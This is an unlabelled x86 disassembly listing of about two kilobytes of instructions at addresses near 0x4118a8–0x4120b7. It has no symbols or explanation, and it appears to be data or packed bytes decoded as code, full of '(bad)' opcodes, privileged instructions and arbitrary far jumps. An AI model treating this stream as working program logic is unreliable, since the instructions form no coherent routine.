  4118a8:	out    dx,al
  4118a9:	test   DWORD PTR [edi+0x75],0x9d6b68f0
  4118b0:	inc    edi
  4118b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118b2:	jge    0x411867
  4118b4:	(bad)  
  4118b5:	je     0x4118d2
  4118b7:	mov    bh,0xae
  4118b9:	mov    edi,0xbfcf1ad0
  4118be:	add    BYTE PTR [ecx+0x39],0x40
  4118c2:	(bad)  
  4118c3:	adc    eax,0xfa0ef8b6
  4118c8:	mov    WORD PTR [ebx-0x17c49e42],gs
  4118ce:	outs   dx,BYTE PTR ds:[esi]
  4118cf:	mov    al,ds:0x62ac6a45
  4118d4:	jg     0x411935
  4118d6:	mov    cl,0x38
  4118d8:	aaa    
  4118d9:	cmp    DWORD PTR [ebx+edi*1-0x4caaffba],esi
  4118e0:	pusha  
  4118e1:	int    0x8a
  4118e3:	out    dx,al
  4118e4:	xchg   edx,eax
  4118e5:	jo     0x411888
  4118e7:	pop    ebx
  4118e8:	sub    BYTE PTR [esi+0x6ff9e94b],bl
  4118ee:	mov    esp,DWORD PTR [ecx+esi*1]
  4118f1:	test   DWORD PTR [ebp+0x21c7ad4a],eax
  4118f7:	mov    eax,0xfc09d3d9
  4118fc:	sub    ecx,DWORD PTR [edi-0x8de126c]
  411902:	add    al,0x31
  411904:	mov    edx,0x3213d868
  411909:	jp     0x4118db
  41190b:	jne    0x41194d
  41190d:	jns    0x41189a
  41190f:	imul   esp,DWORD PTR [ecx],0x621f7e90
  411915:	mov    al,0x2
  411917:	dec    eax
  411918:	fist   DWORD PTR [eax]
  41191a:	mov    dh,0x53
  41191c:	push   0x1b309a88
  411921:	sub    BYTE PTR [esi-0xe],dl
  411924:	sbb    BYTE PTR [eax-0x27cb412],ah
  41192a:	pop    ecx
  41192b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41192c:	lock xchg edx,eax
  41192e:	cmp    al,0x6d
  411930:	lock sbb ecx,ecx
  411933:	pop    esp
  411934:	lods   eax,DWORD PTR ds:[esi]
  411935:	mov    edx,0xc6dfe236
  41193a:	cli    
  41193b:	jno    0x4119b9
  41193d:	jb     0x411991
  41193f:	mov    edx,0xf314e4c7
  411944:	jne    0x4118f0
  411946:	add    DWORD PTR [ebx+0x257a7b65],0xd98da0e7
  411950:	retf   0x826f
  411953:	mov    bl,0x60
  411955:	jl     0x4118f1
  411957:	add    cl,bl
  411959:	cld    
  41195a:	sub    cl,BYTE PTR ds:0xe069d978
  411960:	stos   DWORD PTR es:[edi],eax
  411961:	mov    cs,WORD PTR [ebp-0x6b2ed0a6]
  411967:	cld    
  411968:	lods   eax,DWORD PTR ds:[esi]
  411969:	pop    edi
  41196a:	mov    eax,0xe81e042c
  41196f:	cmp    eax,0xa241fcce
  411974:	sbb    DWORD PTR [ecx],0x491890c0
  41197a:	popf   
  41197b:	mov    eax,0x4fd8767
  411980:	pop    ebp
  411981:	dec    esi
  411982:	out    0x26,al
  411984:	shl    dh,1
  411986:	aas    
  411987:	sti    
  411988:	cli    
  411989:	inc    eax
  41198a:	pop    edi
  41198b:	addr16 cdq 
  41198d:	pop    ecx
  41198e:	leave  
  41198f:	cmp    eax,0x9d98d321
  411994:	test   DWORD PTR [edi-0x152a7889],0xada2e419
  41199e:	or     dh,BYTE PTR [esi-0x25391715]
  4119a4:	cmc    
  4119a5:	sub    eax,0x241b03d9
  4119aa:	xchg   ebx,eax
  4119ab:	dec    ecx
  4119ac:	xor    DWORD PTR [esi-0x11f5601f],edx
  4119b2:	nop
  4119b3:	or     eax,0xdb0af662
  4119b8:	sbb    esi,DWORD PTR [edx]
  4119ba:	adc    DWORD PTR [ebx],0xf38982e4
  4119c0:	sbb    BYTE PTR [ecx-0x29],0x76
  4119c4:	mov    ecx,ecx
  4119c6:	lods   eax,DWORD PTR ds:[esi]
  4119c7:	ins    BYTE PTR es:[edi],dx
  4119c8:	sub    ecx,DWORD PTR [ecx+0x7e]
  4119cb:	ja     0x411a34
  4119cd:	adc    ah,dl
  4119cf:	lahf   
  4119d0:	xor    DWORD PTR [esi+0x1c],esi
  4119d3:	and    bh,0xe5
  4119d6:	xchg   ecx,eax
  4119d7:	sub    bl,ch
  4119d9:	js     0x411a2c
  4119db:	lods   al,BYTE PTR ds:[esi]
  4119dc:	dec    edi
  4119dd:	(bad)  
  4119de:	in     eax,0x1e
  4119e0:	dec    eax
  4119e1:	aad    0x66
  4119e3:	retf   0x6e9d
  4119e6:	pop    ds
  4119e7:	mov    eax,0x6df94472
  4119ec:	xchg   ebp,eax
  4119ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119ee:	pushf  
  4119ef:	adc    al,0x6c
  4119f1:	sbb    al,0x9
  4119f3:	push   edi
  4119f4:	dec    esp
  4119f5:	sub    eax,ebp
  4119f7:	xchg   ebp,eax
  4119f8:	std    
  4119f9:	dec    ebp
  4119fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119fb:	pop    ebx
  4119fc:	mov    dl,0xbc
  4119fe:	out    0x6,al
  411a00:	inc    ecx
  411a01:	and    esp,DWORD PTR ds:0x9288ae5
  411a07:	dec    esp
  411a08:	(bad)  
  411a09:	out    dx,al
  411a0a:	xor    eax,0xd05e165c
  411a0f:	push   0xfffffff0
  411a11:	dec    ebx
  411a12:	retf   0xaa0a
  411a15:	(bad)  
  411a16:	mov    bh,0xf3
  411a18:	cld    
  411a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a1b:	fisub  DWORD PTR cs:[ebx-0x1216d759]
  411a22:	mov    BYTE PTR [edx-0x698b4c0c],ah
  411a28:	lock and eax,ecx
  411a2b:	adc    al,0xe4
  411a2d:	mov    esp,0x590eab38
  411a32:	mov    gs,WORD PTR [ebx]
  411a34:	mov    ah,BYTE PTR [ebx+0xf]
  411a37:	jo     0x411a9b
  411a39:	or     WORD PTR [ebx+edx*4],si
  411a3d:	push   0xcff65970
  411a42:	enter  0xadc1,0xbb
  411a46:	inc    eax
  411a47:	popa   
  411a48:	test   al,0x22
  411a4a:	adc    al,0x42
  411a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a4d:	loop   0x411a26
  411a4f:	cld    
  411a50:	or     cl,dh
  411a52:	(bad)  
  411a54:	push   ss
  411a55:	jmp    0x330e:0x5f9af543
  411a5c:	mov    al,ds:0x3d161c2
  411a61:	adc    bh,BYTE PTR ds:0x2530c994
  411a67:	bound  esi,QWORD PTR [ebx]
  411a69:	and    dl,BYTE PTR [ebx]
  411a6b:	cmp    DWORD PTR [edx+0x79a24ccd],0x2e526640
  411a75:	inc    ebp
  411a76:	cdq    
  411a77:	mov    ds:0x99dd0385,eax
  411a7c:	dec    edx
  411a7d:	das    
  411a7e:	jmp    0x599f:0x9c173e5a
  411a85:	jl     0x411a79
  411a87:	jno    0x411a98
  411a89:	hlt    
  411a8a:	jae    0x411afe
  411a8c:	sbb    BYTE PTR [ecx-0x40094434],0x61
  411a93:	fdivr  QWORD PTR [edi+0x400e8046]
  411a99:	and    DWORD PTR [ecx],ebx
  411a9b:	sub    ah,BYTE PTR [edx+0x44f6cb8e]
  411aa1:	ror    ah,cl
  411aa3:	cdq    
  411aa4:	pop    ecx
  411aa5:	es add al,0xfa
  411aa8:	enter  0x34b6,0xeb
  411aac:	or     al,0xd4
  411aae:	fisubr WORD PTR [ecx]
  411ab0:	mov    ebx,0x890df511
  411ab5:	fs mov edx,0xb1a2254
  411abb:	push   0x19c574f5
  411ac0:	push   es
  411ac1:	cmp    eax,0xeaf58027
  411ac6:	mov    bl,0xfb
  411ac8:	out    dx,al
  411ac9:	(bad)  
  411aca:	xchg   edi,eax
  411acb:	into   
  411acc:	mov    al,0x81
  411ace:	sti    
  411acf:	ror    BYTE PTR [esi],0x1b
  411ad2:	sbb    eax,0x791e8060
  411ad7:	dec    DWORD PTR [ebx-0x5198a19f]
  411add:	inc    edx
  411ade:	inc    ecx
  411adf:	mov    cl,0x3e
  411ae1:	test   al,0x4c
  411ae3:	cmp    DWORD PTR [edx+0x7d],eax
  411ae6:	adc    dl,BYTE PTR fs:[ecx-0x61]
  411aea:	rcr    BYTE PTR [ecx-0x9],0xf5
  411aee:	xchg   eax,ecx
  411af0:	push   eax
  411af1:	stos   DWORD PTR es:[edi],eax
  411af2:	xchg   ecx,eax
  411af3:	mov    al,ds:0xdd410c3d
  411af8:	not    BYTE PTR [bp+di]
  411afb:	push   edx
  411afc:	mov    ss,WORD PTR [ebp-0x47809274]
  411b02:	mov    WORD PTR [edi],es
  411b04:	pop    esi
  411b05:	jg     0x411b0e
  411b07:	ds mov edx,0x6b1f04b1
  411b0d:	rol    DWORD PTR [eax],cl
  411b0f:	inc    esi
  411b10:	jg     0x411b53
  411b12:	xchg   edx,eax
  411b13:	hlt    
  411b14:	pop    edx
  411b15:	loope  0x411aee
  411b17:	sbb    eax,0xef4110c7
  411b1c:	test   al,0xde
  411b1e:	jne    0x411b02
  411b20:	adc    dh,BYTE PTR [ecx+0x4f]
  411b23:	mov    esi,0x1ef3ca77
  411b28:	pop    es
  411b29:	in     al,dx
  411b2a:	and    eax,0x77dc408c
  411b2f:	jg     0x411aca
  411b31:	repz jbe 0x411b87
  411b34:	push   ecx
  411b35:	aas    
  411b36:	es or  al,0x89
  411b39:	push   ebx
  411b3a:	nop
  411b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b3c:	js     0x411aca
  411b3e:	das    
  411b3f:	push   ebp
  411b40:	sbb    BYTE PTR [edi],dh
  411b42:	lea    eax,[edx-0x1d]
  411b45:	xchg   ecx,eax
  411b46:	sbb    eax,0xe774a59f
  411b4b:	or     BYTE PTR [ebp-0x40],dh
  411b4e:	cmp    BYTE PTR [esi+0x46],dh
  411b51:	add    eax,0x5494b3f5
  411b56:	mov    ecx,0xbbf53f34
  411b5b:	lea    esi,[ebp+0x60dd0267]
  411b61:	in     al,0x15
  411b63:	fs mov ebx,0x6aa6fb83
  411b69:	ja     0x411b2e
  411b6b:	test   al,0x1a
  411b6d:	cmp    al,0xd5
  411b6f:	xchg   DWORD PTR [esi+0x57],edx
  411b72:	sub    ah,BYTE PTR [ebx]
  411b74:	xor    al,0x58
  411b76:	jb     0x411b7c
  411b78:	test   al,0xaf
  411b7a:	test   eax,0x4f2b3c4c
  411b7f:	mov    esi,0xdcd3379b
  411b84:	or     eax,0xb39021ad
  411b89:	(bad)  
  411b8a:	int3   
  411b8b:	mov    edi,0x45f1fc33
  411b90:	lods   al,BYTE PTR ds:[esi]
  411b91:	add    dl,BYTE PTR [ecx+eiz*8+0x72beb09d]
  411b98:	dec    ebx
  411b99:	in     eax,dx
  411b9a:	xchg   edi,eax
  411b9b:	sar    esp,cl
  411b9d:	sbb    cl,BYTE PTR [edx+edx*2+0x67]
  411ba1:	or     DWORD PTR [eax],ebp
  411ba3:	test   DWORD PTR [eax-0x3f],ecx
  411ba6:	or     DWORD PTR [ecx+0x6a52d036],ebp
  411bac:	nop    DWORD PTR [ecx+0x22]
  411bb0:	in     al,dx
  411bb1:	fld    DWORD PTR [edi+ebx*8]
  411bb4:	mov    ds:0x9a57b3ec,al
  411bb9:	shr    BYTE PTR [eax-0x4729b774],1
  411bbf:	adc    dh,BYTE PTR [edi*8-0x6b1d3eb7]
  411bc6:	jne    0x411b6a
  411bc8:	xchg   esi,eax
  411bc9:	lods   eax,DWORD PTR ds:[esi]
  411bca:	push   ss
  411bcb:	dec    ecx
  411bcc:	aam    0xd8
  411bce:	pushf  
  411bcf:	xlat   BYTE PTR ds:[ebx]
  411bd0:	xor    cl,bl
  411bd2:	std    
  411bd3:	mov    cl,0xae
  411bd5:	mov    bh,0xcc
  411bd7:	mov    bh,0x2e
  411bd9:	ret    
  411bda:	out    0x43,eax
  411bdc:	ror    BYTE PTR [eax+0x391024cb],1
  411be2:	sti    
  411be3:	je     0x411bc8
  411be5:	push   edx
  411be6:	jbe    0x411c54
  411be8:	fst    DWORD PTR [ebx-0xcb75c7e]
  411bee:	sti    
  411bef:	and    edi,0xffffffb8
  411bf2:	popa   
  411bf3:	dec    esi
  411bf4:	jl     0x411c3d
  411bf6:	or     bl,BYTE PTR [ebx]
  411bf8:	aad    0x62
  411bfa:	or     eax,0x18e1dce6
  411bff:	cmp    al,0xfe
  411c01:	lea    esi,[ebp+esi*1+0x2c4567c5]
  411c08:	ret    0xaac8
  411c0b:	cld    
  411c0c:	xor    esi,DWORD PTR [ebx+0x1f03685b]
  411c12:	jmp    0x79ab4232
  411c17:	sub    eax,0x68844dab
  411c1c:	and    DWORD PTR [ebp-0x1f993e25],esi
  411c22:	or     eax,0xc363a4fa
  411c27:	sahf   
  411c28:	shr    BYTE PTR [eax],cl
  411c2a:	enter  0x464a,0x37
  411c2e:	shl    DWORD PTR ds:0x7974bdae,0x8c
  411c35:	adc    edx,esi
  411c37:	imul   edi,DWORD PTR es:[eax],0x4ff90f8d
  411c3e:	ins    BYTE PTR es:[edi],dx
  411c3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c40:	mov    cl,0x36
  411c42:	popa   
  411c43:	inc    edx
  411c44:	std    
  411c45:	pop    edi
  411c47:	jno    0x411c6a
  411c49:	pop    es
  411c4a:	test   DWORD PTR [eax],ebp
  411c4c:	ror    BYTE PTR [esi],0xb2
  411c4f:	mov    ch,0x54
  411c51:	les    edx,FWORD PTR [eax-0x46]
  411c54:	sbb    bh,0xab
  411c57:	jb     0x411c34
  411c59:	cli    
  411c5a:	int    0x15
  411c5c:	adc    ebx,ebp
  411c5e:	bound  ecx,QWORD PTR [esi-0x73f93050]
  411c64:	call   0x9803:0xe45c7441
  411c6b:	imul   esp,DWORD PTR [edi+eax*2],0x76f88a5d
  411c72:	aad    0x4d
  411c74:	scas   eax,DWORD PTR es:[edi]
  411c75:	addr16 push 0xefa2fc00
  411c7b:	or     al,0x7
  411c7d:	sub    eax,0xbfccfe3b
  411c82:	push   ds
  411c83:	cmp    dl,ch
  411c85:	xor    BYTE PTR [ecx+0x43],ah
  411c88:	cmc    
  411c89:	aam    0xce
  411c8b:	xchg   esi,eax
  411c8c:	daa    
  411c8d:	iret   
  411c8e:	mov    ds:0xf0bb45e,eax
  411c93:	mov    ds:0x7a118388,eax
  411c98:	test   BYTE PTR [ecx+0x5b51b9c0],0x1d
  411c9f:	hlt    
  411ca0:	in     eax,dx
  411ca1:	cli    
  411ca2:	push   esp
  411ca3:	popa   
  411ca4:	in     eax,dx
  411ca5:	popa   
  411ca6:	aad    0x15
  411ca8:	stos   BYTE PTR es:[edi],al
  411ca9:	xchg   esi,eax
  411caa:	push   esp
  411cab:	sbb    dl,ah
  411cad:	and    esp,ebp
  411caf:	ds add eax,eax
  411cb2:	push   esp
  411cb3:	lods   eax,DWORD PTR ds:[esi]
  411cb4:	int3   
  411cb5:	fidiv  DWORD PTR [ebx-0x54a12fbe]
  411cbb:	and    eax,0x82fcbee3
  411cc0:	and    BYTE PTR [ecx+0x3d629d36],ah
  411cc6:	mov    edx,0x404be39b
  411ccb:	jnp    0x411cb9
  411ccd:	arpl   WORD PTR cs:[ecx-0x4935cefd],bx
  411cd4:	add    bh,0xbf
  411cd7:	adc    dh,bl
  411cd9:	xchg   esi,eax
  411cda:	cwde   
  411cdb:	inc    esp
  411cdc:	jo     0x411d0f
  411cde:	dec    esp
  411cdf:	bound  edx,QWORD PTR [esi-0x43]
  411ce2:	int3   
  411ce3:	mov    BYTE PTR [esi],cl
  411ce5:	fdivr  DWORD PTR [edi]
  411ce7:	ds (bad) 
  411ce9:	xor    al,0x23
  411ceb:	aaa    
  411cec:	cs mov ah,0x87
  411cef:	push   edi
  411cf0:	jb     0x411cf2
  411cf2:	mov    BYTE PTR [edx],ch
  411cf4:	test   al,0x6a
  411cf6:	imul   ecx,DWORD PTR [esi+edx*2-0x49],0xffffffc4
  411cfb:	jno    0x411cdf
  411cfd:	xchg   edx,esi
  411cff:	inc    edx
  411d00:	call   0x458aed9e
  411d05:	bound  edi,QWORD PTR [eax+0x3a]
  411d08:	mov    ebp,0xe33d825
  411d0d:	push   es
  411d0e:	add    BYTE PTR [edi],ah
  411d10:	mov    dl,0xe3
  411d12:	dec    ecx
  411d13:	push   0x33bd7543
  411d18:	out    dx,eax
  411d19:	and    eax,0x22e333f2
  411d1e:	cmp    BYTE PTR [ecx+0x7c414d0c],ch
  411d24:	xchg   ax,ax
  411d26:	inc    eax
  411d27:	rcr    DWORD PTR [edi+0x50a2cb3f],1
  411d2d:	shl    DWORD PTR [edx-0x28198670],0xc
  411d34:	sub    eax,0xf13503a4
  411d39:	mov    eax,0x1b67eb05
  411d3e:	and    BYTE PTR [edx-0x634ae7dd],0x48
  411d45:	cmp    bl,BYTE PTR [esi+0x2b]
  411d48:	xchg   ebx,eax
  411d49:	mov    bl,0x2b
  411d4b:	and    al,al
  411d4d:	lods   eax,DWORD PTR ds:[esi]
  411d4e:	int    0x79
  411d50:	jo     0x411d85
  411d52:	xchg   esp,eax
  411d53:	data16 stos BYTE PTR es:[edi],al
  411d55:	sub    esp,eax
  411d57:	xchg   ebx,eax
  411d58:	push   cs
  411d59:	ret    
  411d5a:	test   al,0xa4
  411d5c:	jae    0x411d3e
  411d5e:	adc    BYTE PTR [ebp-0x69],0xd0
  411d62:	xchg   esi,eax
  411d63:	ficom  DWORD PTR [esi]
  411d65:	daa    
  411d66:	repz push edx
  411d68:	adc    eax,0x353b57fa
  411d6d:	int    0xdd
  411d6f:	add    BYTE PTR [ebp-0x261159b9],ch
  411d75:	ss and eax,0xe31a7ca6
  411d7b:	mov    eax,0x26fd6455
  411d80:	push   edi
  411d81:	pushf  
  411d82:	sbb    ebx,DWORD PTR [ebx-0x777f0bed]
  411d88:	inc    ecx
  411d89:	xor    BYTE PTR [ebx-0x56e88c31],dh
  411d8f:	mov    ds:0xacc88132,eax
  411d94:	add    dl,BYTE PTR [ecx-0x13]
  411d97:	push   0x92d9b841
  411d9c:	pop    ebp
  411d9d:	mov    db0,eax
  411da0:	mov    bh,0x85
  411da2:	jecxz  0x411db2
  411da4:	mov    BYTE PTR [esi+0x7e871e30],al
  411daa:	push   esp
  411dab:	gs out 0x80,al
  411dae:	add    BYTE PTR [edx],al
  411db0:	pop    esp
  411db1:	rep ins BYTE PTR es:[edi],dx
  411db3:	cmp    DWORD PTR [eax+ebp*2+0x64f3decc],edi
  411dba:	repz frstor [ebp-0x7aadaf36]
  411dc1:	in     al,0xb4
  411dc3:	popf   
  411dc4:	rol    bh,0xf6
  411dc7:	mov    ebx,gs
  411dc9:	push   esi
  411dca:	ret    
  411dcb:	cdq    
  411dcc:	adc    eax,0x994f70b
  411dd1:	mov    ds:0xd4e60c52,eax
  411dd6:	push   esi
  411dd7:	mov    ebp,0x34bdf954
  411ddc:	sub    BYTE PTR [edi+edx*1-0x551624d6],bh
  411de3:	repnz adc esp,DWORD PTR [ebx+0x14]
  411de7:	or     al,0xc2
  411de9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dea:	xchg   esp,ebp
  411dec:	jecxz  0x411dc7
  411dee:	fwait
  411def:	push   ss
  411df0:	out    dx,eax
  411df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411df2:	cmc    
  411df3:	adc    al,cl
  411df5:	push   esp
  411df6:	cmp    eax,0x3f1d0e73
  411dfb:	pop    edx
  411dfc:	cmp    eax,0x8e96caeb
  411e01:	fisubr DWORD PTR [edx]
  411e03:	add    ebx,DWORD PTR [eax-0x5c243b0a]
  411e09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e0a:	adc    dl,BYTE PTR [eax+0x7e33610e]
  411e10:	sbb    ebx,ebp
  411e12:	mov    dh,0xb4
  411e14:	test   al,0xa8
  411e16:	or     eax,0xac21ed11
  411e1b:	xor    edi,DWORD PTR [edx+0x5]
  411e1e:	xchg   esp,eax
  411e1f:	aam    0x44
  411e21:	sbb    al,0xc7
  411e23:	or     DWORD PTR [edx+esi*2],ecx
  411e26:	sub    al,0x8b
  411e28:	dec    esp
  411e29:	jecxz  0x411de9
  411e2b:	or     esi,DWORD PTR [ebx]
  411e2d:	daa    
  411e2e:	inc    esp
  411e2f:	mov    ebp,edx
  411e31:	lock fist DWORD PTR [ebp+0x6e]
  411e35:	mov    ebp,0x8d81087
  411e3a:	outs   dx,DWORD PTR ds:[esi]
  411e3b:	retf   
  411e3c:	adc    al,0x2f
  411e3e:	in     eax,0xb
  411e40:	inc    ebx
  411e41:	xchg   ebx,eax
  411e42:	cmp    al,0xdc
  411e44:	pop    eax
  411e45:	add    eax,0x472eec07
  411e4a:	sbb    ecx,edx
  411e4c:	mov    esp,0xc59b8c49
  411e51:	(bad)  
  411e52:	in     al,dx
  411e53:	aaa    
  411e54:	jg     0x411e86
  411e56:	xor    DWORD PTR [ebp+0x65],edi
  411e59:	test   BYTE PTR [ebx+0xecd57e3],bl
  411e5f:	sbb    cl,0x90
  411e62:	sub    eax,0xa8f1f636
  411e67:	sub    DWORD PTR [ebx],ebp
  411e69:	in     al,dx
  411e6a:	dec    ebp
  411e6b:	inc    ebp
  411e6c:	mov    ah,0xc5
  411e6e:	cs addr16 xchg ebx,eax
  411e71:	push   edx
  411e72:	mov    edx,0x191fef49
  411e77:	call   0xb5b96e59
  411e7c:	add    BYTE PTR [eax-0x5b168dc2],bl
  411e82:	mov    edi,0x23f17b5e
  411e87:	je     0x411ee6
  411e89:	ins    DWORD PTR es:[edi],dx
  411e8a:	into   
  411e8b:	jecxz  0x411e17
  411e8d:	push   ebp
  411e8e:	jge    0x411e8e
  411e90:	ficom  WORD PTR [ebp+0x3]
  411e93:	or     eax,0x533422bc
  411e98:	jne    0x411f09
  411e9a:	jnp    0x411e3c
  411e9c:	mov    edi,0x6b614781
  411ea1:	adc    BYTE PTR [edx-0x37e0b405],0xab
  411ea8:	push   eax
  411ea9:	inc    esi
  411eaa:	pop    esp
  411eab:	(bad)  
  411eac:	imul   ebx,DWORD PTR [ecx+0x676ec6dd],0x829fb5d0
  411eb6:	xchg   BYTE PTR [edx],cl
  411eb8:	fisub  DWORD PTR [edx]
  411eba:	jmp    0xd0f5:0x4696488a
  411ec1:	pop    esp
  411ec2:	push   ebx
  411ec3:	data16 ja 0x411ee5
  411ec6:	es and eax,0x52c8406a
  411ecc:	adc    eax,0x55a13dee
  411ed1:	pop    eax
  411ed2:	inc    ebp
  411ed3:	sub    al,0x9a
  411ed5:	lock jns 0x411edf
  411ed8:	xchg   esp,eax
  411ed9:	push   ebx
  411eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411edb:	mov    dl,0x96
  411edd:	or     al,0xc5
  411edf:	mov    al,0xa8
  411ee1:	lods   eax,DWORD PTR ds:[esi]
  411ee2:	mov    ebp,0x8fb03f6d
  411ee7:	mov    eax,ds:0x59d767ff
  411eec:	jge    0x411f1b
  411eee:	into   
  411eef:	call   0x1ae7:0xcf2887a4
  411ef6:	sahf   
  411ef7:	into   
  411ef8:	pop    esi
  411ef9:	add    DWORD PTR [ebp+0x4a],esi
  411efc:	sub    DWORD PTR [ebp+0x29],0x2e
  411f00:	in     al,0xdf
  411f02:	xchg   esi,eax
  411f03:	or     bl,BYTE PTR [ebx*2+0x5b5c3723]
  411f0a:	jl     0x411ef6
  411f0c:	rcl    BYTE PTR [ebx+0x3caba051],1
  411f12:	in     eax,dx
  411f13:	xor    edi,esi
  411f15:	xor    DWORD PTR [edx-0x66d5d826],edx
  411f1b:	(bad)  
  411f1c:	xor    esp,ebx
  411f1e:	push   ss
  411f1f:	cmc    
  411f20:	test   al,0x36
  411f22:	pop    ecx
  411f23:	rcl    esp,cl
  411f25:	call   0x797a:0x360af081
  411f2c:	arpl   WORD PTR [esi-0xbd838a2],bx
  411f32:	loope  0x411efc
  411f34:	out    0x50,eax
  411f36:	stos   DWORD PTR es:[edi],eax
  411f37:	nop
  411f38:	inc    eax
  411f39:	add    BYTE PTR [ebp+0x26373491],dl
  411f3f:	mov    ds:0xc819031b,eax
  411f44:	or     ecx,DWORD PTR [edx]
  411f46:	sbb    dh,BYTE PTR [ecx]
  411f48:	cmp    eax,0x59543f8f
  411f4d:	mov    bl,0x3b
  411f4f:	rol    BYTE PTR ds:0x59a6fe49,cl
  411f55:	push   ds
  411f56:	pusha  
  411f57:	jns    0x411f98
  411f59:	js     0x411fba
  411f5b:	sbb    eax,0x98f2510b
  411f60:	lods   al,BYTE PTR ds:[esi]
  411f61:	push   esi
  411f62:	loopne 0x411f67
  411f64:	pushf  
  411f65:	gs push 0xffffffe7
  411f68:	and    ebx,DWORD PTR [ebp-0x1e276eed]
  411f6e:	data16 jb 0x411f11
  411f71:	xchg   edx,eax
  411f72:	out    0x51,al
  411f74:	and    ebp,eax
  411f76:	sbb    BYTE PTR [ebp-0x11294824],ch
  411f7c:	jmp    0xf465:0xa66c4b4b
  411f83:	sbb    al,0xac
  411f85:	mov    gs,eax
  411f87:	inc    eax
  411f88:	pop    ss
  411f89:	fwait
  411f8a:	mov    ds:0x10830388,al
  411f8f:	out    dx,eax
  411f90:	icebp  
  411f91:	or     al,0xaa
  411f93:	jb     0x411f3f
  411f95:	iret   
  411f96:	leave  
  411f97:	cmp    esi,DWORD PTR [ebp-0x1d84fb04]
  411f9d:	repnz in eax,0xab
  411fa0:	pop    ebp
  411fa1:	and    al,0x51
  411fa3:	call   0x7ac:0x3d03e657
  411faa:	and    eax,esp
  411fac:	or     DWORD PTR [ecx],ecx
  411fae:	sbb    edx,ebp
  411fb0:	jmp    0x9b4a:0xe4daef46
  411fb7:	dec    BYTE PTR [ebp-0x9038d03]
  411fbd:	push   cs
  411fbe:	ds mov edi,0x8e583fc
  411fc4:	(bad)  
  411fc5:	or     dl,bh
  411fc7:	loopne 0x411f8b
  411fc9:	mov    dl,0xa9
  411fcb:	inc    esi
  411fcc:	push   eax
  411fcd:	loopne 0x411f89
  411fcf:	mov    ebx,0xa8b05a85
  411fd4:	ins    BYTE PTR es:[edi],dx
  411fd5:	ret    
  411fd6:	xchg   DWORD PTR [eax+0x77fa1f18],edx
  411fdc:	fistp  QWORD PTR [esi+0x17]
  411fdf:	sbb    cl,BYTE PTR [ebx+0x68]
  411fe2:	jecxz  0x411ff6
  411fe4:	xlat   BYTE PTR ds:[ebx]
  411fe5:	call   0xbdd97316
  411fea:	icebp  
  411feb:	xchg   esi,eax
  411fec:	sbb    dh,BYTE PTR [ecx]
  411fee:	lock push cs
  411ff0:	iret   
  411ff1:	(bad)  
  411ff2:	jo     0x412013
  411ff4:	stos   BYTE PTR es:[edi],al
  411ff5:	or     eax,0xe2669f9c
  411ffa:	adc    al,cl
  411ffc:	xchg   ebx,eax
  411ffd:	push   ss
  411ffe:	cmp    al,0xad
  412000:	pop    edx
  412001:	out    dx,al
  412002:	push   ds
  412003:	shr    BYTE PTR [edi-0x189f5640],cl
  412009:	sbb    DWORD PTR [edx+0x51e69a5f],ecx
  41200f:	sbb    eax,0xb91b07a
  412014:	pop    ds
  412015:	push   ds
  412016:	push   ds
  412017:	leave  
  412018:	adc    ah,al
  41201a:	jns    0x412023
  41201c:	mov    fs:0xeae8a878,eax
  412022:	and    DWORD PTR [edi],ebx
  412024:	outs   dx,DWORD PTR ds:[esi]
  412025:	mov    BYTE PTR [ebx+0x3379d6d],dl
  41202b:	repz jp 0x411fde
  41202e:	push   edx
  41202f:	xchg   edx,eax
  412030:	and    al,0x28
  412032:	xor    BYTE PTR [ebx+eiz*1+0xbd94153],dl
  412039:	push   eax
  41203a:	out    0x7b,al
  41203c:	aam    0xd7
  41203e:	dec    esp
  41203f:	inc    esp
  412040:	jmp    0x411fc5
  412042:	jae    0x412060
  412044:	push   ds
  412045:	or     al,0x4
  412047:	scas   al,BYTE PTR es:[edi]
  412048:	scas   al,BYTE PTR es:[edi]
  412049:	pop    ss
  41204a:	fsubr  QWORD PTR [ecx]
  41204c:	add    al,0xef
  41204e:	daa    
  41204f:	jno    0x412066
  412051:	shr    DWORD PTR [ebx-0x4c],cl
  412054:	mov    bh,0x45
  412056:	nop
  412057:	jne    0x412086
  412059:	xor    BYTE PTR [esi-0x447357c8],dh
  41205f:	pop    ds
  412060:	retf   0x9e74
  412063:	xchg   edi,eax
  412064:	retf   0x4b5f
  412067:	mov    cl,0x15
  412069:	jecxz  0x412067
  41206b:	pop    esp
  41206c:	(bad)  
  41206e:	gs ret 0xce8a
  412072:	inc    ebp
  412073:	inc    esp
  412074:	sbb    BYTE PTR [edx-0x28],ah
  412077:	add    ecx,0xd3129cf5
  41207d:	stos   DWORD PTR es:[edi],eax
  41207e:	sbb    esi,DWORD PTR [ebx]
  412080:	lahf   
  412081:	out    dx,eax
  412082:	mov    bl,BYTE PTR [ebx+0x5e]
  412085:	stc    
  412086:	sub    edi,DWORD PTR ds:0xe2a2ebb3
  41208c:	sub    dh,cl
  41208e:	and    al,0x93
  412090:	pop    edi
  412091:	mov    dl,0xcf
  412093:	cmp    al,ah
  412095:	ins    BYTE PTR es:[edi],dx
  412096:	retf   
  412097:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412098:	test   DWORD PTR [esi],ebx
  41209a:	js     0x4120b6
  41209c:	dec    ecx
  41209d:	in     al,0x20
  41209f:	dec    edx
  4120a0:	or     ebp,0x94f5dcb1
  4120a6:	fdiv   st(7),st
  4120a8:	mov    WORD PTR [edi],?
  4120aa:	jmp    0x1502:0xdd5dcff7
  4120b1:	mov    bl,0x68
  4120b3:	(bad)  
  4120b4:	pusha  
  4120b5:	lds    esp,FWORD PTR [edx]
  4120b7:	std    
